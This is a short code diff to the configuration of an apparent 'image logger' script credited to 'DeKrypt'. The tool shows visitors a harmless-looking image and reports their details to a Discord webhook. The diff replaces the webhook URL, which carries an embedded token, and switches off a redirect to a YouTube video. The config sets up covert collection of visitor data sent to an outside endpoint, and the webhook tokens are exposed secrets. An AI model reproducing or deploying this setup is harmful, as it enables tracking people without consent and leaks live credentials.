@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1340421824923701459/v7xfAJiYL_qmj0-7QzOQfVfijhVsTY60IcZi7FowtZvzPdUBo69bgeSR-3kVfpwCPvQW",
+    "webhook": "https://discord.com/api/webhooks/1522921389810516108/Mfxmtl3oy6i_G0-66qJj6aL-OfR6Thb8zZKvbGQol52tVNV_1PVqiIUvNWg41r7Hptcp",
     "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -51,7 +51,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://www.youtube.com/watch?v=xvFZjo5PgG0" # Link to the webpage to redirect to 
     },
 
